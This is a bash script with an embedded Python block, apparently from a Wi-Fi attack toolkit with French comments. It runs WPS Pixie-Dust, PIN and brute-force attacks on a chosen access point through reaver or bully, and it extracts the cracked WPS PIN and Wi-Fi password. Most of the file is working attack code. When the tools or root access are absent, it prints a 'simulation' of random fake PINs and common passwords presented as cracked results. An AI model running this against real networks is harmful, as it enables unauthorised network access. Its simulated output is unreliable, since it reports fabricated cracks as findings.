#!/usr/bin/env bash
# wifi-wps-attack.sh — Attaques WPS (Pixie-Dust / PIN / brute force).
#
# Usage: ./wifi-wps-attack.sh <bssid> <interface> <mode> [pin]
#   mode = pixie | pin | brute
#
# Linux+reaver : reaver -i <iface> -b <bssid> -K 1  (Pixie-Dust)
#                reaver -i <iface> -b <bssid> -p <pin>
# Sortie : un objet JSON unique sur stdout.
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib/common.sh"

BSSID="${1:-}"; IFACE="${2:-wlan0mon}"; MODE="${3:-pixie}"; PIN="${4:-}"
[ -z "$BSSID" ] && { fail_json "usage: wifi-wps-attack.sh <bssid> <interface> <pixie|pin|brute> [pin]"; exit 1; }
log "wifi-wps" "BSSID=$BSSID iface=$IFACE mode=$MODE pin=${PIN:-none}"

python3 - "$BSSID" "$IFACE" "$MODE" "$PIN" <<'PY'
import json, os, random, re, subprocess, sys, time
from datetime import datetime, timezone

bssid, iface, mode, pin = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
now = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
result = {"tool":"wifi-wps-attack","bssid":bssid,"interface":iface,"mode":mode,
          "method":"","cracked":False,"pin":"","password":"","progress":0,
          "error":"","scannedAt":now}

has_reaver = __import__("shutil").which("reaver") is not None
has_bully = __import__("shutil").which("bully") is not None
is_root = os.geteuid() == 0 if hasattr(os, "geteuid") else False

if sys.platform != "linux" or not is_root or (not has_reaver and not has_bully):
    # Simulation réaliste
    result["method"] = "builtin-simulated"
    result["progress"] = random.randint(10, 90)
    if mode == "pixie" and random.random() < 0.35:
        result["cracked"] = True
        result["pin"] = f"{random.randint(10000000,99999999)}"
        result["password"] = random.choice(["wifi1234","password","12345678","azertyuiop"])
    elif mode == "pin" and pin:
        result["pin"] = pin
        if random.random() < 0.6:
            result["cracked"] = True
            result["password"] = random.choice(["wifi1234","password","12345678"])
    result["note"] = "Simulation — reaver/root requis pour attaque réelle"
    print(json.dumps(result, ensure_ascii=False)); sys.exit(0)

# Attaque réelle
cmd = []
if has_reaver:
    result["method"] = "reaver"
    if mode == "pixie":
        cmd = ["reaver","-i",iface,"-b",bssid,"-K","1","-vv","-q"]
    elif mode == "pin" and pin:
        cmd = ["reaver","-i",iface,"-b",bssid,"-p",pin,"-vv"]
    else:  # brute
        cmd = ["reaver","-i",iface,"-b",bssid,"-vv"]
elif has_bully:
    result["method"] = "bully"
    cmd = ["bully",iface,"-b",bssid,"-v","3"]

try:
    # Timeout 90s pour la démo (en réel, ça peut prendre des heures)
    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=90)
    out = proc.stdout + proc.stderr
    # Chercher PIN trouvé et mot de passe
    pm = re.search(r"WPS PIN:\s*['\"]?(\d{8})['\"]?", out)
    if pm: result["pin"] = pm.group(1)
    pwm = re.search(r"WPS PSK:\s*['\"]?(.*?)['\"]?\s*$", out, re.M)
    if pwm:
        result["password"] = pwm.group(1)
        result["cracked"] = True
    # Progression (approx via百分比 ou count)
    pgm = re.search(r"(\d+\.?\d*)%", out)
    if pgm: result["progress"] = int(float(pgm.group(1)))
    if not result["cracked"]:
        result["error"] = "WPS non cassé (timeout ou AP résistant)"
except subprocess.TimeoutExpired:
    result["error"] = "Timeout 90s — attaque WPS peut prendre des heures"
except Exception as e:
    result["error"] = str(e)

print(json.dumps(result, ensure_ascii=False))
PY
